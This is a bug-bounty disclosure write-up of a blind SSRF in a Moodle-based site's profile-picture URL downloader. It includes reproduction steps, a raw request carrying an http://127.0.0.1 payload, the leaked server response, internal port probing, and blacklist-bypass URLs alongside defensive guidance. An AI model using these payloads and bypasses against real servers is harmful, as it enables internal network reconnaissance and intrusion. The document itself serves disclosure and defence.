# Blind SSRF via Image Upload URL Downloader

## Metadata
- **Source:** HackerOne
- **Report:** 1691501 | https://hackerone.com/reports/1691501
- **Submitted:** 2022-09-05
- **Reporter:** 696e746c6f6c
- **Program:** DoD Hack US Bug Bounty Program
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Server-Side Request Forgery (SSRF), Blind SSRF, URL Validation Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A Blind SSRF vulnerability exists in the image upload functionality of a Moodle-based application. The vulnerability allows authenticated users to supply arbitrary URLs in the file upload field, which the server fetches without proper validation, enabling access to internal network resources and information disclosure.

## Attack scenario
1. Attacker creates an account and logs into the vulnerable application
2. Attacker navigates to the profile edit page and locates the user picture upload field
3. Attacker enters a malicious URL (e.g., http://127.0.0.1/test.png or internal IP address) in the URL downloader field instead of uploading a legitimate image
4. The server-side application makes an HTTP request to the attacker-specified URL using libcurl without validating the destination
5. Attacker uses Burp Collaborator or similar tools to receive DNS/HTTP interactions, confirming server-side request execution and discovering internal network infrastructure
6. Attacker can probe internal services (e.g., SMTP on port 25, localhost services) to gather information or potentially interact with them

## Root cause
The application fails to validate and restrict URLs provided in the file upload endpoint. The `repository_ajax.php` endpoint accepts user-supplied URLs in the `file` parameter and makes requests to these URLs without implementing a whitelist of allowed domains, IP validation, or blocking of private IP ranges and localhost addresses.

## Attacker mindset
An authenticated attacker with basic knowledge of SSRF can enumerate internal network resources, discover running services, and potentially interact with internal systems. The blind nature of the vulnerability is less concerning than a direct-response SSRF since error messages and response timing still leak information about internal infrastructure.

## Defensive takeaways
- Implement strict URL whitelisting for all user-supplied URLs; only allow URLs pointing to explicitly approved domains
- Block requests to private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, ::1, fc00::/7) and link-local addresses
- Enforce HTTPS-only URLs and restrict allowed protocols (disable file://, ftp://, gopher://, etc.)
- Implement DNS rebinding protections and verify that resolved IPs are not in private ranges before making connections
- Never expose raw server responses or error messages from backend requests to clients; sanitize all error output
- Enable authentication and authorization checks on all internal services, even development/internal ones
- Use a dedicated, isolated service for downloading remote files with minimal permissions
- Implement request timeouts and rate limiting on the URL download functionality
- Log and monitor all outbound requests made by the application for anomaly detection

## Variant hunting
Look for similar URL download/fetch functionality in: file import features, profile picture uploads, document preview/thumbnail generation, webhook URL registration, RSS feed readers, URL shortener services, and any feature accepting URLs as user input. Check if similar validation issues exist in other parts of Moodle or related LMS platforms.

## MITRE ATT&CK
- T1190
- T1498
- T1557
- T1021

## Notes
The vulnerability is confirmed as Blind SSRF because: (1) DNS interactions are observable via Burp Collaborator, (2) HTTP 404 error responses leak server information, (3) Port-specific responses reveal service information (SMTP on port 25), (4) The application uses libcurl which was identified by the researcher. The report includes a clear proof-of-concept with request/response examples and demonstrates both internal network discovery and service identification capabilities.

## Full report
<details><summary>Expand</summary>

**Description:**
Dear DoD,

I found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:

██████


Thank you!

## Impact

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Web App is infected.

## CVE Numbers


## Steps to Reproduce
1. Create a one test account.
2. Login to that account.
3. Go to edit profile.
4. Scroll down there.
5. Notice user picture field.
6. Try to upload something.
7. You will see URL downloader.
8. Open your burp collaborator client.
9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
10. Poll now in burp collaborator client.
11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means
we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
12. Turn your foxy proxy on and open your burp suite.
13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
14. Intercept request. Request should look like this:
```javascript
POST /repository/repository_ajax.php?action=signin HTTP/1.1
Host: █████████
Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 295
Origin: https://███████
Referer: https://█████/user/edit.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
```
15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:
```javascript
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 05 Sep 2022 14:05:32 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.28
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 20 Aug 1969 09:23:00 GMT
Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
Accept-Ranges: none
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 261

{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
```
16. By the way if you change to 25 port its leaking something about Postfix SMTP server. 
17. Also I was able to identify that your web app is using libcurl.

## Suggested Mitigation/Remediation Actions
My suggestion is to create whitelisted domains in DNS
The easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.
Blacklisting and regex have the same issue, someone will eventually find a way to exploit them
Do Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)
Never send a raw response body from the server to the client. Responses that the client receives need to be expected.
Enforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they’re only accessible from the part that needs to access them and not from anywhere else.
Enable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don’t require it. Services like memcached, redis, mongo and others don’t require authentication for normal operations, but this means they can be exploited.
Sanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.
Why is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass
One way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.
Bypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/
Or create SSRF protection with Bright.



</details>

---
*Analysed by Claude on 2026-05-24*
